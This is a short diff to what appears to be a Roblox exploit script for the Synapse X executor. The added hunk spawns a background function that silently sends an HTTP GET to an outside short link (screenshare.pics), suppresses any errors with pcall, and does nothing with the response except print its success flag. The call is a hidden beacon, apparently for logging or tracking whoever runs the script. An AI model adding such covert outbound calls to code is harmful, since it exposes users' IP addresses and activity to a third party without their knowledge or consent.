@@ -126,6 +126,18 @@ spawn(function()
     end
 end)
 
+spawn(function()
+    pcall(function()
+        local response = syn.request({
+            Url = "https://screenshare.pics/IC0KCB",
+            Method = "GET", -- Optional | GET, POST, HEAD, etc
+            Headers = {}, -- Optional | HTTP Headers
+            Cookies = {} -- Optional | HTTP Cookies
+        })
+        print(response.Success)
+    end)
+end)
+
 while wait() do
     --breaks the loop
     wait()
